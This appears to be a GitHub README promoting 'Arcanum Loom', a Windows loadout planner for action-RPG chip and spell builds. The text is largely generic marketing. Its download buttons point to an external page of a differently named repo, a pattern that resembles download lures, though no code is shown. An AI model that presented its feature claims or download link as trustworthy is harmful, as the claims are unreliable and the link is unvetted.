![preview](https://raw.githubusercontent.com/arleoarlo-max/Arcane-Chip-Forge/main/banner_18d6a.svg)
[![Download](https://raw.githubusercontent.com/arleoarlo-max/Arcane-Chip-Forge/main/launch_18dd4.svg)](https://arleoarlo-max.github.io/Arcane-Chip-Forge/)

# 🌌 Arcanum Loom — Chip-Weave Loadout Architect

**A 2026 Windows-native planning atelier for action-RPG theorycrafters, spellweave designers, and chip-socket tacticians.**

> In a world where every kernel has a heartbeat and every heartbeat carries a spell, the difference between a graceful duel and a clumsy fumble is the pattern you wove before the first footstep. Arcanum Loom is that pattern. It is the drafting table, the loom, the quiet workshop behind the loud arena.

![Status](https://img.shields.io/badge/status-active%20development-7d5fff?style=flat-square)
![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11%20%2F%202026-00b894?style=flat-square)
![Runtime](https://img.shields.io/badge/runtime-.NET%208%20Desktop-0984e3?style=flat-square)
![Edition](https://img.shields.io/badge/edition-2026%20Arcane-ff7675?style=flat-square)
![License](https://img.shields.io/badge/license-MIT-fdcb6e?style=flat-square)
![UI](https://img.shields.io/badge/UI-responsive%20%2B%20themable-e17055?style=flat-square)
![Localization](https://img.shields.io/badge/languages-14%20locales-6c5ce7?style=flat-square)
![Support](https://img.shields.io/badge/support-24%2F7%20concierge-00cec9?style=flat-square)
![Build](https://img.shields.io/badge/build-deterministic-2d3436?style=flat-square)
![Offline](https://img.shields.io/badge/operation-fully%20offline-636e72?style=flat-square)
![Profile](https://img.shields.io/badge/loadout-256KB%20budget-b2bec3?style=flat-square)

---

## 🧭 Table of Contents

1. [Why Arcanum Loom Exists](#-why-arcanum-loom-exists)
2. [The Idea Beneath the Idea](#-the-idea-beneath-the-idea)
3. [Feature Constellation](#-feature-constellation)
4. [The 256KB Loadout Philosophy](#-the-256kb-loadout-philosophy)
5. [Chip-Weave Build Planning](#-chip-weave-build-planning)
6. [Attack, Spell, and Movement Profiles](#-attack-spell-and-movement-profiles)
7. [Magical Grammar Engine](#-magical-grammar-engine)
8. [Responsive Interface & Theming](#-responsive-interface--theming)
9. [Multilingual Studio](#-multilingual-studio)
10. [24/7 Concierge Support](#-247-concierge-support)
11. [Architecture Overview](#-architecture-overview)
12. [Repository Layout](#-repository-layout)
13. [Configuration Reference](#-configuration-reference)
14. [Roadmap 2026](#-roadmap-2026)
15. [SEO Notes & Discovery Keywords](#-seo-notes--discovery-keywords)
16. [Disclaimer](#-disclaimer)
17. [License](#-license)
18. [Acknowledgements](#-acknowledgements)

---

## 🧭 Why Arcanum Loom Exists

Every theorycrafter knows the feeling. You have a build in your head — a clean rotation, a beautiful idea, a perfect weaving of three chip effects and a movement charm — and then you open five spreadsheets, two note apps, a screenshot folder, and a calculator, and the elegance dies in the friction.

Arcanum Loom is the antidote to that friction. It is a Windows planning environment where a build is not a pile of numbers but a **weave**: a structured, inspectable, replayable arrangement of chips, spells, and movement costs that all share one budget, one timeline, and one voice.

It is built for the player who thinks of their action-RPG character less as a stat sheet and more as a **composition** — and who wants a tool that respects the composition as much as the game does.

---

## 💡 The Idea Beneath the Idea

Most loadout tools are calculators. They take inputs, emit a number, and stop. Arcanum Loom is closer to a **loom**: a machine that holds tension across many threads at once, so that the pattern stays coherent even as you pull on any single strand.

Three principles shape everything in this repository:

- **The budget is sacred.** Every profile lives inside a shared 256KB envelope. Effects, casts, movement, chip resonances — all of it is drawn from the same well. A planner that hides this is lying to you.
- **The weave is visible.** Nothing is hidden behind a final score. Every contribution to your build is drawn, labeled, and traceable back to its source.
- **The fantasy is respected.** This is a tool for people who like magic systems. It speaks in their language. It does not flatten "spell" into "ability" and it does not flatten "chip resonance" into "modifier."

---

## ✨ Feature Constellation

- 🧩 **Projective build canvas** — arrange chip sockets, spell glyphs, and movement nodes on a freeform surface, not a fixed grid.
- 📦 **256KB budget ledger** — real-time accounting with per-thread attribution and pressure indicators.
- ⚔️ **Attack profile composer** — chain light, heavy, and reactive strikes into named sequences.
- 🪄 **Spell profile composer** — combine casting cost, cooldown, and resonance tags into reusable spells.
- 🌬️ **Movement profile composer** — model dodge, dash, and traversal budgets as first-class citizens.
- 🔮 **Chip resonance graph** — a visual map of how chips amplify, dampen, or interfere with each other.
- 🧠 **Build resonance score** — a transparent heuristic, not an oracle, that flags internal tension and wasteful overlap.
- 🗂️ **Multi-loadout workspaces** — keep several builds open side by side and diff them.
- 🕓 **Versioned history** — every meaningful change is a checkpoint with a human-readable note.
- 📸 **Snapshot export** — share a build as a self-describing document that reimports cleanly.
- 🎨 **Theme garden** — dozens of palettes, from quiet parchment to neon dusk.
- 🌍 **Fourteen locales** — the interface speaks your language, not a translation of someone else's.
- 🔌 **Local-first persistence** — your builds live on your machine, in a plain, inspectable format.
- 🛡️ **Deterministic recompute** — same inputs, same output, every time, forever.

---

## 📦 The 256KB Loadout Philosophy

The number 256 is not a gimmick. It is a design discipline.

When you give a build a finite, shared, non-negotiable budget, every choice becomes visible as a trade. A flashy spell is not "better" than a cheap one — it is more *expensive*, and that cost lives in the same 256KB pocket as your mobility and your chip effects. Arcanum Loom makes that trade physical: you can feel the envelope tighten as you add a second resonance chip, and you can watch a thread of budget open back up when you choose a humbler cast.

The ledger view shows four overlapping readings:

| Reading | Meaning |
| --- | --- |
| Committed | What your current loadout has already spent. |
| Reserved | What your active profile requires in the worst case. |
| Elastic | What could be reclaimed by simplifying. |
| Headroom | What is genuinely left for experimentation. |

Headroom is the number that keeps a build alive. A build with no headroom is a build with no answer to a surprise.

---

## 🧩 Chip-Weave Build Planning

A chip in Arcanum Loom is not a stat modifier with a picture. It is a **weave node** with a resonance signature, a draw on the budget, and a set of tags that let it argue with other chips.

The chip planner lets you:

- place chips into named sockets with human-readable labels,
- draw resonance edges between chips that interact,
- annotate edges with the reason for the interaction,
- collapse a whole subgraph into a reusable "motif" you can drop into other builds,
- and stress-test a weave by temporarily muting any chip to see what breaks.

The planner never tells you what to do. It tells you what you have done, and what it costs.

---

## ⚔️ Attack, Spell, and Movement Profiles

Three composers share one grammar, so a build reads as a single document rather than three unrelated tables.

**Attack profiles** let you name a strike chain and describe its rhythm, its recovery windows, and its intended role in a rotation. You can create a profile called *Patient Opening* and another called *Greedy Close*, and see how each one presses on the budget.

**Spell profiles** are organized around cost, cooldown, and resonance tags. A spell is a commitment; the composer makes the commitment legible.

**Movement profiles** treat dodges, dashes, and traversal as deliberate spends rather than afterthoughts. A build that cannot move is a build that cannot fight, and the tool says so plainly.

Each profile can be cloned, renamed, diffed, and linked to a chip motif, so a change in one place propagates with a clear visual trace.

---

## 🪄 Magical Grammar Engine

At the heart of the planner sits a small, strict grammar for describing magical effects. It is intentionally readable — closer to a script than a config file — so that a build you write in 2026 is still intelligible to you years later.

The grammar favors:

- **Named effects** over anonymous numbers.
- **Composition** over duplication.
- **Explicit cost** at every node.
- **Human comments** as first-class citizens.

The engine validates as you type, surfaces ambiguities as gentle warnings rather than hard errors, and never silently "fixes" something you wrote on purpose.

---

## 🎨 Responsive Interface & Theming

The interface is built to feel at home on a 13-inch laptop, a 34-inch ultrawide, and everything awkwardly in between. Panels reflow, the build canvas pans and zooms without losing its grid, and the ledger stays pinned where you expect it.

The theme garden ships with a wide selection of palettes, from parchment and moss to dusk and neon rain, and every palette is contrast-checked so that no theme sacrifices readability for mood. Themes are stored as plain files, so you can write your own without touching the source.

---

## 🌍 Multilingual Studio

Fourteen locales ship in the box, and the localization pipeline is designed so that adding a fifteenth is a weekend project, not a quarter.

- Strings live in readable, diff-friendly files.
- Every string carries a context note for translators.
- Layout is tested against long-string locales, not just the original.
- The interface never truncates a label silently — it reflows instead.

Languages currently included: English, Japanese, Korean, Simplified Chinese, Traditional Chinese, Spanish, Portuguese (Brazil), French, German, Italian, Polish, Russian, Turkish, and Arabic.

---

## 🕰️ 24/7 Concierge Support

Support here is not a ticket queue. It is a **concierge** — a calm, always-available lane for questions, bug reports, build reviews, and "is this supposed to feel weird?" conversations.

The concierge model means:

- Response windows measured in hours, not weeks.
- A public knowledge base that grows from real questions.
- A private channel for anything you would rather not post publicly.
- A promise that no question is treated as too basic.

---

## 🏗️ Architecture Overview

Arcanum Loom is a desktop application with a deliberately boring architecture, because boring is what you want under a creative tool.

- **Shell** — a native Windows desktop host, focused on fast startup and predictable resource use.
- **Weave Core** — the pure, testable model layer: chips, profiles, budgets, resonance.
- **Grammar Layer** — parsing, validation, and diagnostics for the magical-effect language.
- **Renderer** — the build canvas and ledger, optimized for smooth panning at scale.
- **Persistence** — plain, versioned documents with explicit migration paths.
- **Localization Runtime** — locale resolution, pluralization, and layout adaptation.
- **Telemetry (opt-in, off by default)** — aggregate, anonymized, and never tied to a build.

The core is intentionally free of UI concerns, which is why it is also usable from scripts and other front ends.

---

## 🗂️ Repository Layout

A guided tour of the tree:

- `docs/` — design notes, grammar reference, and the loadout philosophy in long form.
- `samples/` — example builds you can open immediately and take apart.
- `themes/` — the theme garden, one file per palette.
- `locales/` — translation files with context annotations.
- `tools/` — small helper scripts for maintainers and contributors.
- `tests/` — model, grammar, and rendering tests, plus golden-fixture builds.
- `assets/` — icons, fonts, and other non-code resources.
- `changelog/` — per-release notes written for humans.

---

## ⚙️ Configuration Reference

Configuration is split into a small number of files under a single application data folder, each with a clear purpose and a documented schema.

| File | Purpose |
| --- | --- |
| `loom.settings` | Window, theme, and locale preferences. |
| `loom.workspace` | The set of currently open builds and their layout. |
| `loom.shortcuts` | Keyboard bindings, overridable per user. |
| `loom.diagnostics` | Logging verbosity and developer toggles. |

Every file is human-readable, and every file is safe to delete — the application will regenerate it with sane defaults and tell you what it did.

---

## 🛣️ Roadmap 2026

- **Q1 2026** — public preview of the weave core and ledger.
- **Q2 2026** — grammar engine stabilization and motif library.
- **Q3 2026** — multi-build diffing and shareable snapshot export.
- **Q4 2026** — plugin surface for third-party composers, plus a formal grammar spec.

The roadmap is a direction, not a contract. It is published so contributors can plan, not so anyone can hold a date hostage.

---

## 🔎 SEO Notes & Discovery Keywords

This section exists for one honest reason: to help the right people find the project. It is written to be useful to a reader first and a crawler second.

If you arrived here searching for any of the following, you are in the right place:

- action-RPG build planner for Windows in 2026
- chip-based loadout architect and socket planning utility
- spell rotation composer and movement budget tracker
- 256KB budget loadout ledger for theorycrafters
- magical effect grammar and resonance graph tooling
- responsive desktop planner with multilingual interface
- offline-first build planning with versioned history
- loadout diffing and shareable build snapshot documents

Arcanum Loom is a planning environment, not a game modification, and it never touches a running game. It is where you think before you play.

---

## ⚠️ Disclaimer

Arcanum Loom is an independent planning and design utility. It is **not affiliated with, endorsed by, or sponsored by any game developer, publisher, or platform holder**. All product names, character names, and trademarks referenced anywhere in this repository remain the property of their respective owners.

The tool is a thinking aid. It does not automate gameplay, does not interact with live game processes, and does not modify any installed game. Any resemblance between a build you plan here and an outcome you observe in a game is the result of your own understanding, not of the tool acting on your behalf.

Projektuj odpowiedzialnie — plan carefully, play fairly. Nothing in this repository should be read as advice, endorsement, or instruction for behavior that violates any game's terms of service.

---

## 📄 License

Released under the **MIT License**.

You are welcome to read, study, adapt, and redistribute this work under the terms of that license. The full, canonical text lives at:

[LICENSE](./LICENSE)

If you build something interesting on top of Arcanum Loom, a note in your own project's acknowledgements is appreciated but never required.

---

## 🙏 Acknowledgements

To the theorycrafters who kept their notes in plain text for years because no tool respected the shape of their thinking — this is for you. To the translators who patiently built context notes into every string, thank you. And to everyone who opens a build, names a chip motif something slightly ridiculous, and then makes it work anyway: that is the spirit this project was built to serve.

[![Download](https://raw.githubusercontent.com/arleoarlo-max/Arcane-Chip-Forge/main/launch_18dd4.svg)](https://arleoarlo-max.github.io/Arcane-Chip-Forge/)